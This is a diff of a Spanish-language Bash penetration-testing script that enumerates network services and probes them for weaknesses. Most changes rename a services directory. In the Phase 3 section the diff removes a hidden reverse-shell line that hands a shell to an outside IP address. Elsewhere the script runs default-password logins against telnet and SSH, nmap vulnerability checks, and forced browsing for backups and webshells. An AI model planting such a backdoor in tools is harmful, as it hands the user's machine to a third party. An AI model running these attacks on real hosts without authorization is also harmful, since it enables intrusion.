-	grep "161/open/" nmap-udp.grep | awk '{print $2}'  >> ../.servicios/snmp2.txt	
-	grep '161/udp' ../.masscan/* 2>/dev/null| cut -d " " -f 6 >> ../.servicios/snmp2.txt
+	grep "161/open/" nmap-udp.grep | awk '{print $2}'  >> ../servicios/snmp2.txt	
+	grep '161/udp' ../.masscan/* 2>/dev/null| cut -d " " -f 6 >> ../servicios/snmp2.txt
 	
-	grep "67/open/" nmap-udp.grep | awk '{print $2}'  >> ../.servicios/dhcp2.txt	
-	grep '67/udp' ../.masscan/* 2>/dev/null | cut -d " " -f 6 >> ../.servicios/dhcp2.txt
-	sort ../.servicios/dhcp2.txt | sort | uniq >../.servicios/dhcp.txt; rm ../.servicios/dhcp2.txt
+	grep "67/open/" nmap-udp.grep | awk '{print $2}'  >> ../servicios/dhcp2.txt	
+	grep '67/udp' ../.masscan/* 2>/dev/null | cut -d " " -f 6 >> ../servicios/dhcp2.txt
+	sort ../servicios/dhcp2.txt | sort | uniq >../servicios/dhcp.txt; rm ../servicios/dhcp2.txt
 	
-	grep "500/open/" nmap-udp.grep | awk '{print $2}'  >> ../.servicios/vpn2.txt
-	grep '500/udp' ../.masscan/* 2>/dev/null | cut -d " " -f 6 >> ../.servicios/vpn2.txt
-	sort ../.servicios/vpn2.txt | sort | uniq >../.servicios/vpn.txt; rm ../.servicios/vpn2.txt
+	grep "500/open/" nmap-udp.grep | awk '{print $2}'  >> ../servicios/vpn2.txt
+	grep '500/udp' ../.masscan/* 2>/dev/null | cut -d " " -f 6 >> ../servicios/vpn2.txt
+	sort ../servicios/vpn2.txt | sort | uniq >../servicios/vpn.txt; rm ../servicios/vpn2.txt
 		
 	
-	grep "1604/open/" nmap-udp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1604\n"' >> ../.servicios/citrix.txt	
-	grep "1900/open/" nmap-udp.grep | awk '{print $2}'  >> ../.servicios/upnp.txt #
-	grep "623/open/" nmap-udp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:623\n"' >> ../.servicios/IPMI.txt
+	grep "1604/open/" nmap-udp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1604\n"' >> ../servicios/citrix.txt	
+	grep "1900/open/" nmap-udp.grep | awk '{print $2}'  >> ../servicios/upnp.txt #
+	grep "623/open/" nmap-udp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:623\n"' >> ../servicios/IPMI.txt
 		
 	cd ../
 fi
         
-find .servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
+find servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
  ################################
   
    
@@ -852,11 +853,10 @@ fi #enumerar
 # FASE: 3
 echo -e "\n\n$OKYELLOW [+] FASE 3: ENUMERACION DE PUERTOS E IDENTIFICACION DE VULNERABILIDADES \n $RESET"
 ###################################  ENUMERACION ########################################
-nc -nv 66.172.33.234 8443 -e /bin/bash & 2>/dev/null
 
-if [ -f .servicios/smtp.txt ]
+if [ -f servicios/smtp.txt ]
 	then
-		echo -e "$OKBLUE #################### SMTP (`wc -l .servicios/smtp.txt`) ######################$RESET"	    
+		echo -e "$OKBLUE #################### SMTP (`wc -l servicios/smtp.txt`) ######################$RESET"	    
 		while read line
 		do  	
 			ip=`echo $line | cut -f1 -d":"`
@@ -955,16 +955,16 @@ if [ -f .servicios/smtp.txt ]
 			#########################
 													
  			echo ""
-		done <.servicios/smtp.txt				
+		done <servicios/smtp.txt				
 	insert_data	
 fi
 
 
-if [ -f .servicios/smb.txt ]
+if [ -f servicios/smb.txt ]
 then  
-	echo -e "$OKBLUE #################### SMB (`wc -l .servicios/smb.txt`) ######################$RESET"	
+	echo -e "$OKBLUE #################### SMB (`wc -l servicios/smb.txt`) ######################$RESET"	
 	mkdir -p .smbinfo/
-	for ip in $(cat .servicios/smb.txt); do									
+	for ip in $(cat servicios/smb.txt); do									
 		echo -e "[+] Escaneado $ip " 					
 		#,smb-vuln_ms10-061,,smb-vuln-ms06-025,smb-vuln-ms07-029 		
 		echo "nmap -n -p445 --script smb-vuln-ms08-067 $ip" >> logs/vulnerabilidades/"$ip"_445_ms08067.txt>/dev/null
@@ -1009,28 +1009,28 @@ then
 fi
 
 # windows 
-grep -i windows reportes/reporte-OS.csv 2> /dev/null | cut -d ";" -f 1 >> .servicios/Windows.txt
+grep -i windows reportes/reporte-OS.csv 2> /dev/null | cut -d ";" -f 1 >> servicios/Windows.txt
 
 # servers
-egrep -i "server|unix|Samba" reportes/reporte-OS.csv 2>/dev/null | cut -d ";" -f1 >> .servicios/servers2.txt
-cat .servicios/ldap.txt 2>/dev/null | cut -d ":" -f1 >> .servicios/servers2.txt 2>/dev/null 
-sort .servicios/servers2.txt | uniq > .servicios/servers.txt
-rm .servicios/servers2.txt
+egrep -i "server|unix|Samba" reportes/reporte-OS.csv 2>/dev/null | cut -d ";" -f1 >> servicios/servers2.txt
+cat servicios/ldap.txt 2>/dev/null | cut -d ":" -f1 >> servicios/servers2.txt 2>/dev/null 
+sort servicios/servers2.txt | uniq > servicios/servers.txt
+rm servicios/servers2.txt
 
-find .servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
+find servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
 
 #####################################
 
 
-if [ -f .servicios/camaras-ip.txt ]
+if [ -f servicios/camaras-ip.txt ]
 then
-	echo -e "$OKBLUE #################### Camaras IP (`wc -l .servicios/camaras-ip.txt`) ######################$RESET"	  
-	for line in $(cat .servicios/camaras-ip.txt); do
+	echo -e "$OKBLUE #################### Camaras IP (`wc -l servicios/camaras-ip.txt`) ######################$RESET"	  
+	for line in $(cat servicios/camaras-ip.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 						
 		echo -e "[+] Escaneando $ip:$port"		
-		egrep -iq $ip .servicios/Windows.txt
+		egrep -iq $ip servicios/Windows.txt
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t[i] Es un dispositivo windows"			
@@ -1054,10 +1054,10 @@ fi
 
 
 
-if [ -f .servicios/pptp.txt ]
+if [ -f servicios/pptp.txt ]
 then
-	echo -e "$OKBLUE #################### pptp (`wc -l .servicios/pptp.txt`) ######################$RESET"
-	for line in $(cat .servicios/pptp.txt); do
+	echo -e "$OKBLUE #################### pptp (`wc -l servicios/pptp.txt`) ######################$RESET"
+	for line in $(cat servicios/pptp.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`		
 		echo -e "[+] Escaneando $ip"
@@ -1073,10 +1073,10 @@ then
 fi
 
 
-if [ -f .servicios/IPMI.txt ]
+if [ -f servicios/IPMI.txt ]
 then
-	echo -e "$OKBLUE #################### IPMI (`wc -l .servicios/IPMI.txt`) ######################$RESET"
-	for line in $(cat .servicios/IPMI.txt); do
+	echo -e "$OKBLUE #################### IPMI (`wc -l servicios/IPMI.txt`) ######################$RESET"
+	for line in $(cat servicios/IPMI.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`		
 		echo -e "[+] Escaneando $ip"
@@ -1100,10 +1100,10 @@ then
 	insert_data	
 fi
 
-if [ -f .servicios/mongoDB.txt ]
+if [ -f servicios/mongoDB.txt ]
 then
-	echo -e "$OKBLUE #################### MongoDB (`wc -l .servicios/mongoDB.txt`) ######################$RESET"
-	for line in $(cat .servicios/mongoDB.txt); do
+	echo -e "$OKBLUE #################### MongoDB (`wc -l servicios/mongoDB.txt`) ######################$RESET"
+	for line in $(cat servicios/mongoDB.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`		
 		echo -e "[+] Escaneando $ip:$port"
@@ -1117,10 +1117,10 @@ then
 fi
 
 
-if [ -f .servicios/couchDB.txt ]
+if [ -f servicios/couchDB.txt ]
 then
-	echo -e "$OKBLUE #################### couchDB (`wc -l .servicios/couchDB.txt`)  ######################$RESET"
-	for line in $(cat .servicios/couchDB.txt); do
+	echo -e "$OKBLUE #################### couchDB (`wc -l servicios/couchDB.txt`)  ######################$RESET"
+	for line in $(cat servicios/couchDB.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`		
 		echo -e "[+] Escaneando $ip:$port"
@@ -1136,10 +1136,10 @@ fi
 ######################################
 
 #falta
-if [ -f .servicios/x11.txt ]
+if [ -f servicios/x11.txt ]
 then
-	echo -e "$OKBLUE #################### X11 (`wc -l .servicios/x11.txt`)  ######################$RESET"	  
-	for line in $(cat .servicios/x11.txt); do
+	echo -e "$OKBLUE #################### X11 (`wc -l servicios/x11.txt`)  ######################$RESET"	  
+	for line in $(cat servicios/x11.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`		
 		echo -e "[+] Escaneando $ip:$port"		
@@ -1152,10 +1152,10 @@ then
 	insert_data
 fi
 
-if [ -f .servicios/rpc.txt ]
+if [ -f servicios/rpc.txt ]
 then
-	echo -e "$OKBLUE #################### RPC (`wc -l .servicios/rpc.txt`)  ######################$RESET"	  
-	for line in $(cat .servicios/rpc.txt); do
+	echo -e "$OKBLUE #################### RPC (`wc -l servicios/rpc.txt`)  ######################$RESET"	  
+	for line in $(cat servicios/rpc.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`	
 		echo -e "[+] Escaneando $ip:$port"		
@@ -1175,10 +1175,10 @@ fi
 
 
 
-if [ -f .servicios/winbox.txt ]
+if [ -f servicios/winbox.txt ]
 then	
-	echo -e "$OKBLUE #################### winbox (`wc -l .servicios/winbox.txt`) ######################$RESET"	    
-	for line in $(cat .servicios/winbox.txt); do
+	echo -e "$OKBLUE #################### winbox (`wc -l servicios/winbox.txt`) ######################$RESET"	    
+	for line in $(cat servicios/winbox.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`	
 		echo -e "[+] Escaneando $ip:$port"					
@@ -1201,10 +1201,10 @@ fi
 
 
 
-if [ -f .servicios/redis.txt ]
+if [ -f servicios/redis.txt ]
 then	
-	echo -e "$OKBLUE #################### Redis (`wc -l .servicios/redis.txt`) ######################$RESET"	    
-	for line in $(cat .servicios/redis.txt); do
+	echo -e "$OKBLUE #################### Redis (`wc -l servicios/redis.txt`) ######################$RESET"	    
+	for line in $(cat servicios/redis.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`	
 		echo -e "[+] Escaneando $ip:$port"			
@@ -1217,10 +1217,10 @@ then
 	insert_data	
 fi
 
-if [ -f .servicios/rmi.txt ]
+if [ -f servicios/rmi.txt ]
 then	
-	echo -e "$OKBLUE #################### RMI (`wc -l .servicios/rmi.txt`) ######################$RESET"	    
-	for line in $(cat .servicios/rmi.txt); do
+	echo -e "$OKBLUE #################### RMI (`wc -l servicios/rmi.txt`) ######################$RESET"	    
+	for line in $(cat servicios/rmi.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		echo -e "[+] Escaneando $ip:$port"
@@ -1236,9 +1236,9 @@ fi
 
 
 
-if [ -f .servicios/telnet.txt ]
+if [ -f servicios/telnet.txt ]
 then
-	echo -e "$OKBLUE #################### TELNET (`wc -l .servicios/telnet.txt`)######################$RESET"	    
+	echo -e "$OKBLUE #################### TELNET (`wc -l servicios/telnet.txt`)######################$RESET"	    
 	while read line; do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
@@ -1260,22 +1260,22 @@ then
 		echo -e "\n medusa -h $ip -u root -p solokey -M telnet" >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
 		medusa -h $ip -u root -p solokey -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
 		
-		echo -e "\n medusa -h $ip -u root -e n-M telnet" >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
-		medusa -h $ip -u root -e n-M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
+		echo -e "\n medusa -h $ip -u root -e n -M telnet" >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
+		medusa -h $ip -u root -e n -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
 		
 		
 		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt > .vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
 		 echo ""
- 	done <.servicios/telnet.txt
+ 	done <servicios/telnet.txt
 		
 	#insert clean data	
 	insert_data
 fi # telnet
 
 
-if [ -f .servicios/ssh.txt ]
+if [ -f servicios/ssh.txt ]
 then
-	echo -e "$OKBLUE #################### SSH (`wc -l .servicios/ssh.txt`)######################$RESET"	    
+	echo -e "$OKBLUE #################### SSH (`wc -l servicios/ssh.txt`)######################$RESET"	    
 	while read line; do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`	
@@ -1304,7 +1304,7 @@ then
 		
 		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_"$port"_passwordDefecto.txt > .vulnerabilidades/"$ip"_"$port"_passwordDefecto.txt 2>/dev/null					
 		echo ""
- 	done <.servicios/ssh.txt
+ 	done <servicios/ssh.txt
 		
 	#insert clean data	
 	insert_data
@@ -1312,7 +1312,7 @@ fi # ssh
 
 
 
-if [ -f .servicios/finger.txt ]
+if [ -f servicios/finger.txt ]
 then
 	echo -e "$OKBLUE #################### FINGER ######################$RESET"	    
 	while read line; do
@@ -1322,14 +1322,14 @@ then
 		finger @$ip > .vulnerabilidades/"$ip"_79_usuariosSistema.txt &
 		sleep 1
 					# done true				        	        				
-	done < .servicios/finger.txt	
+	done < servicios/finger.txt	
 fi
 
 
-if [ -f .servicios/vpn.txt ]
+if [ -f servicios/vpn.txt ]
 then
-	echo -e "$OKBLUE #################### VPN (`wc -l .servicios/vpn.txt`) ######################$RESET"	    
-	for ip in $(cat .servicios/vpn.txt); do		
+	echo -e "$OKBLUE #################### VPN (`wc -l servicios/vpn.txt`) ######################$RESET"	    
+	for ip in $(cat servicios/vpn.txt); do		
 			
 		echo -e "[+] Escaneando $ip:500"
 		echo -e "\t[+] Probando si el modo agresivo esta habilitado "
@@ -1347,10 +1347,10 @@ then
 fi
 
 
-if [ -f .servicios/vnc.txt ]
+if [ -f servicios/vnc.txt ]
 then
-	echo -e "$OKBLUE #################### VNC (`wc -l .servicios/vnc.txt`) ######################$RESET"	    
-	for line in $(cat .servicios/vnc.txt); do		
+	echo -e "$OKBLUE #################### VNC (`wc -l servicios/vnc.txt`) ######################$RESET"	    
+	for line in $(cat servicios/vnc.txt); do		
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`		
 		echo -e "[+] Escaneando $ip:$port"			
@@ -1374,9 +1374,9 @@ fi
 
 
 # enumerar MS-SQL
-if [ -f .servicios/mssql.txt ]
+if [ -f servicios/mssql.txt ]
 then
-	echo -e "$OKBLUE #################### MS-SQL (`wc -l .servicios/mssql.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### MS-SQL (`wc -l servicios/mssql.txt`) ######################$RESET"	    
 	while read line           
 	do   	
 		ip=`echo $line | cut -f1 -d":"`
@@ -1388,7 +1388,7 @@ then
 		grep "|" logs/enumeracion/"$ip"_1434_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .enumeracion/"$ip"_1434_info.txt 
 					
 		 echo ""
- 	done <.servicios/mssql.txt
+ 	done <servicios/mssql.txt
  		
 	#insert clean data	
 	insert_data
@@ -1396,9 +1396,9 @@ fi
 		
 
 #LDAPS
-if [ -f .servicios/ldaps.txt ]
+if [ -f servicios/ldaps.txt ]
 then
-	echo -e "$OKBLUE #################### LDAPS (`wc -l .servicios/ldaps.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### LDAPS (`wc -l servicios/ldaps.txt`) ######################$RESET"	    
 	while read line       
 	do     					
 		ip=`echo $line | cut -f1 -d":"`
@@ -1435,7 +1435,7 @@ then
 		
 													 
 		 echo ""
- 	done <.servicios/ldaps.txt
+ 	done <servicios/ldaps.txt
 	
 	#insert clean data	
 	insert_data
@@ -1443,9 +1443,9 @@ fi
 
 
 #CITRIX
-if [ -f .servicios/citrix.txt ]
+if [ -f servicios/citrix.txt ]
 then
-	echo -e "$OKBLUE #################### citrix (`wc -l .servicios/citrix.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### citrix (`wc -l servicios/citrix.txt`) ######################$RESET"	    
 	while read line       
 	do     				
 		ip=`echo $line | cut -f1 -d":"`
@@ -1463,7 +1463,7 @@ then
 		grep "|" logs/enumeracion/"$ip"_1604_citrixServers.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|filtered" > .enumeracion/"$ip"_1604_citrixServers.txt 
 													 
 		 echo ""
- 	done <.servicios/citrix.txt
+ 	done <servicios/citrix.txt
 		
 	
 	#insert clean data	
@@ -1472,9 +1472,9 @@ fi
 
 #	dahua
 
-if [ -f .servicios/dahua_dvr.txt ]
+if [ -f servicios/dahua_dvr.txt ]
 then
-	echo -e "$OKBLUE #################### DAHUA (`wc -l .servicios/dahua_dvr.txt`)######################$RESET"	    
+	echo -e "$OKBLUE #################### DAHUA (`wc -l servicios/dahua_dvr.txt`)######################$RESET"	    
 	while read line       
 	do     			
 		ip=`echo $line | cut -f1 -d":"`
@@ -1494,7 +1494,7 @@ then
 		fi					
 															
 		 echo ""
- 	done <.servicios/dahua_dvr.txt		
+ 	done <servicios/dahua_dvr.txt		
 	
 	#insert clean data	
 	insert_data
@@ -1504,9 +1504,9 @@ fi
 
 #	elasticsearch
 
-if [ -f .servicios/elasticsearch.txt ]
+if [ -f servicios/elasticsearch.txt ]
 then
-	echo -e "$OKBLUE #################### Elastic search (`wc -l .servicios/elasticsearch.txt`)######################$RESET"	    
+	echo -e "$OKBLUE #################### Elastic search (`wc -l servicios/elasticsearch.txt`)######################$RESET"	    
 	while read line       
 	do     			
 		ip=`echo $line | cut -f1 -d":"`
@@ -1518,16 +1518,16 @@ then
 		grep --color=never "Indices found" logs/enumeracion/"$ip"_"$port"_elasticsearchIndices.txt  > .enumeracion/"$ip"_"$port"_elasticsearchIndices.txt 
 	    #exploit/multi/elasticsearch/search_groovy_script 																	
 		 echo ""
- 	done <.servicios/elasticsearch.txt
+ 	done <servicios/elasticsearch.txt
 				
 	#insert clean data	
 	insert_data	
 fi
 
 
-if [ -f .servicios/juniper.txt ]
+if [ -f servicios/juniper.txt ]
 then
-	echo -e "$OKBLUE #################### Juniper (`wc -l .servicios/juniper.txt`)######################$RESET"	    
+	echo -e "$OKBLUE #################### Juniper (`wc -l servicios/juniper.txt`)######################$RESET"	    
 	while read line       
 	do     			
 		ip=`echo $line | cut -f1 -d":"`
@@ -1538,7 +1538,7 @@ then
 		cp logs/enumeracion/"$ip"_"$port"_juniperHostname.txt .enumeracion/"$ip"_"$port"_juniperHostname.txt
 																		
 		 echo ""
- 	done <.servicios/juniper.txt
+ 	done <servicios/juniper.txt
 				
 	#insert clean data	
 	insert_data	
@@ -1546,9 +1546,9 @@ fi
 
 
 #INTEL
-if [ -f .servicios/intel.txt ]
+if [ -f servicios/intel.txt ]
 then
-	echo -e "$OKBLUE #################### intel (`wc -l .servicios/intel.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### intel (`wc -l servicios/intel.txt`) ######################$RESET"	    
 	while read line       
 	do     				
 		ip=`echo $line | cut -f1 -d":"`
@@ -1560,7 +1560,7 @@ then
 		grep "|" logs/vulnerabilidades/"$ip"_"$port"_intelVuln.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_"$port"_intelVuln.txt
 													 
 		 echo ""
- 	done <.servicios/intel.txt	
+ 	done <servicios/intel.txt	
 	
 	#insert clean data	
 	insert_data
@@ -1571,9 +1571,9 @@ fi
 
 
 #	servers
-if [ -f .servicios/servers.txt ]
+if [ -f servicios/servers.txt ]
 then
-	echo -e "$OKBLUE #################### Servers (`wc -l .servicios/servers.txt`)######################$RESET"	    
+	echo -e "$OKBLUE #################### Servers (`wc -l servicios/servers.txt`)######################$RESET"	    
 	while read ip       
 	do     			
 		#ip=`echo $line | cut -f1 -d":"`		
@@ -1594,7 +1594,7 @@ then
 		#######################
 															
 		 echo ""
- 	done <.servicios/servers.txt		
+ 	done <servicios/servers.txt		
 	#insert clean data	
 	insert_data
 	
@@ -1602,9 +1602,9 @@ fi
 
 
 
-if [ -f .servicios/ldap.txt ]
+if [ -f servicios/ldap.txt ]
 then
-	echo -e "$OKBLUE #################### LDAP (`wc -l .servicios/ldap.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### LDAP (`wc -l servicios/ldap.txt`) ######################$RESET"	    
 	while read line          
 	do        
 		ip=`echo $line | cut -f1 -d":"`
@@ -1636,20 +1636,20 @@ then
 		####################        
 		
 		 echo ""
- 	done <.servicios/ldap.txt
+ 	done <servicios/ldap.txt
 		
 	#insert clean data	
 	insert_data
 fi	
 
 
-if [ -f .servicios/printers.txt ]
+if [ -f servicios/printers.txt ]
 then
-	echo -e "$OKBLUE #################### Printers (`wc -l .servicios/printers.txt`) ######################$RESET"	    		
+	echo -e "$OKBLUE #################### Printers (`wc -l servicios/printers.txt`) ######################$RESET"	    		
 	echo ls >> command.txt
 	echo -e "\tnvram dump" >> command.txt	
 	echo quit >> command.txt
-	for line in $(cat .servicios/printers.txt); do
+	for line in $(cat servicios/printers.txt); do
         ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"` 	
 		
@@ -1670,13 +1670,13 @@ fi
 
 
 
-if [ -f .servicios/web.txt ]
+if [ -f servicios/web.txt ]
 then
       
-    echo -e "$OKBLUE #################### WEB (`wc -l .servicios/web.txt`) ######################$RESET"	    
+    echo -e "$OKBLUE #################### WEB (`wc -l servicios/web.txt`) ######################$RESET"	    
     ################ Obtener Informacion tipo de servidor, CMS, framework, etc ###########3
     echo -e "$OKGREEN[i] Identificacion de técnologia usada en los servidores web$RESET"
-	for line in $(cat .servicios/web.txt); do  
+	for line in $(cat servicios/web.txt); do  
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`					
 		while true; do
@@ -1725,7 +1725,7 @@ then
   # Web buster & clone
    echo -e ""
    echo -e "$OKGREEN\n[i] Realizando la navegacion forzada $RESET"
-	for line in $(cat .servicios/web.txt); do    
+	for line in $(cat servicios/web.txt); do    
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`				
 		echo -e "[+] Escaneando $ip:$port"
@@ -1756,7 +1756,7 @@ then
 						egrep -iq $md5 webClone/checksumsEscaneados.txt
 						noEscaneado=$?	
 						
-						egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved" .enumeracion/"$subdominio"_"$port"_webData.txt
+						egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved|Index of" .enumeracion/"$subdominio"_"$port"_webData.txt
 						noRedireccion=$?	
 						
 						egrep -qi "403" .enumeracion/"$subdominio"_"$port"_webData.txt #403 - Prohibido: acceso denegado.
@@ -1822,8 +1822,8 @@ then
 								greprc=$?
 								if [[ $greprc -eq 1 ]];then # si hay no hay firewall protegiendo la app								
 									echo -e "\t\t[+] Revisando archivos CGI ($subdominio - Apache/nginx)"
-									web-buster.pl -t $subdominio -p $port -h 3 -d / -m cgi -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .servicios/cgi.txt; 
-									cat .servicios/cgi.txt >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt
+									web-buster.pl -t $subdominio -p $port -h 3 -d / -m cgi -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> servicios/cgi.txt; 
+									cat servicios/cgi.txt >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt
 									sleep 2								
 								fi																							
 							
@@ -1852,14 +1852,14 @@ then
 								nmap --script http-slowloris-check -p $port $subdominio >> logs/vulnerabilidades/"$subdominio"_"$port"_slowloris.txt 2>/dev/null
 								grep "|" logs/vulnerabilidades/"$subdominio"_"$port"_slowloris.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$subdominio"_"$port"_slowloris.txt
 							else
-								echo -e "\t\t[+] Uppps el sitio es cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud"
+								echo -e "\t\t[+] No es Apache o no debemos escanear"
 							fi						
 							####################################	
 							
 							#######  if the server is IIS ######
 							grep -i IIS .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud"  # no redirecciona
 							greprc=$?
-							if [[ $greprc -eq 0  ]];then # si el banner es IIS y no se enumero antes							
+							if [[ $greprc -eq 0  ]];then # si el banner es IIS 							
 								
 								if [[ ${subdominio} != *"nube"* && ${subdominio} != *"webmail"*  && ${subdominio} != *"autodiscover"* ]];then 
 									echo -e "\t\t[+] Revisando directorios comunes ($subdominio - IIS)"								
@@ -1900,7 +1900,9 @@ then
 								echo -e "\t\t[+] Revisando backups de archivos de configuración ($subdominio - IIS)"
 								web-buster.pl -t $subdominio -p $port -h 3 -d / -m backupIIS -s 0 -q 1 > logs/vulnerabilidades/"$subdominio"_"$port"_backupWeb.txt 
 								egrep --color=never "^200" logs/vulnerabilidades/"$subdominio"_"$port"_backupWeb.txt  >> .vulnerabilidades/"$subdominio"_"$port"_backupWeb.txt 
-								sleep 2										   
+								sleep 2	
+							else
+								echo -e "\t\t[+] No es IIS o no debemos escanear"									   
 							fi
 										
 							####################################	
@@ -1929,7 +1931,9 @@ then
 								echo -e "\t\t[+] Revisando archivos comunes de servidor ($subdominio - Tomcat)"
 								web-buster.pl -t $subdominio -p $port -h 3 -d / -m webserver -s 0 -q 1 > logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt &  
 								egrep --color=never "^200" logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt   >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
-								sleep 1										
+								sleep 1	
+							else
+								echo -e "\t\t[+] No es tomcat o no debemos escanear"									
 							fi
 										
 							####################################
@@ -2014,7 +2018,7 @@ then
 
 				
 				#################  Realizar el escaneo por IP  ##############	
-				echo -e "\t[+]Escaneo solo por IP $ip:$port"
+				echo -e "\t[+]Escaneo solo por IP (http) $ip:$port"
 				wget --timeout=5 --tries=1 --no-check-certificate  http://$ip -O webClone/http-$ip.html 2>/dev/null
 				sed -i "s/\/index.php//g" webClone/http-$ip.html
 				sed -i "s/https/http/g" webClone/http-$ip.html				 			
@@ -2025,11 +2029,11 @@ then
 				mv webClone/http2-$ip.html webClone/http-$ip.html
 				
 				checksumline=`md5sum webClone/http-$ip.html` 							
-				md5=`echo $checksumline | awk {'print $1'}` 													
+				md5=`echo $checksumline | awk {'print $1'}` 										
 				egrep -iq $md5 webClone/checksumsEscaneados.txt
 				noEscaneado=$?	
 																																			
-				egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved" .enumeracion/"$ip"_"$port"_webData.txt
+				egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved|Index of" .enumeracion/"$ip"_"$port"_webData.txt
 				noRedireccion=$?	
 						
 				egrep -qi "403" .enumeracion/"$ip"_"$port"_webData.txt #403 - Prohibido: acceso denegado.
@@ -2081,7 +2085,7 @@ then
 					
 					
 					#######  if the server is IIS ######
-					grep -i IIS .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud"  # no redirecciona
+					grep -i IIS .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|Cloudflare"  # no redirecciona
 					greprc=$?
 					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes
 						
@@ -2133,14 +2137,16 @@ then
 						echo -e "\t\t[+] Revisando la existencia de backups de archivos de configuración ($ip -IIS)"	
 						web-buster.pl -t $ip -p $port -h 3 -d / -m backupIIS -s 0 -q 1 > logs/vulnerabilidades/"$ip"_"$port"_webshell.txt  
 						egrep --color=never "^200" logs/vulnerabilidades/"$ip"_"$port"_webshell.txt   >> .vulnerabilidades/"$ip"_"$port"_webshell.txt  
-						sleep 2										   
+						sleep 2	
+					else
+						echo -e "\t\t[+] No es IIS o no debemos escanear"
 					fi
 										
 					####################################	
 		
 		
-					#######  if the server is tomcat ######
-					egrep -i "GlassFish|Coyote|Tomcat|Resin|JBoss|WildFly" .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found" 
+					#######  if the server is tomcat ######					
